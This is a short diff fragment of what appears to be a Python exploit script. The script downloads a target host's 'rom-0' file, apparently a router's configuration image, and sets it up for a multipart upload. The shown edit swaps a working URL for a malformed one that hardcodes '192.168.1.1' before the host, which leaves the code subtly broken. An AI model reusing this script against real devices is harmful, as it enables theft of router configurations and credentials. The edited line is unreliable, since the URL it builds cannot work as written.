@@ -21,7 +21,7 @@ except:
     pass
 try:
     host=str(sys.argv[1])
-    urllib.urlretrieve ("http://"+host+"/rom-0", "rom-0")
+    urllib.urlretrieve ("http:192.168.1.1//"+host+"/rom-0", "rom-0")
 
     datagen, headers = multipart_encode({"uploadedfile": open("rom-0")})
 
